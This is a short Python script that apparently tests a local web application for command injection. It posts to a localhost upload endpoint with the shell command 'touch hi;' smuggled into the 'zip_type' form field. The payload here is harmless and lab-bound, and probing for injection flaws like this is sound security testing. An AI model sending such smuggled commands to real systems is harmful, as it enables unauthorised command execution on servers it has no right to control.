import requests

r = requests.post(" http://127.0.0.1:5000/upload", data={"zip_type": "touch hi;", "mode": "zip", "file": ""})
print(r.text)
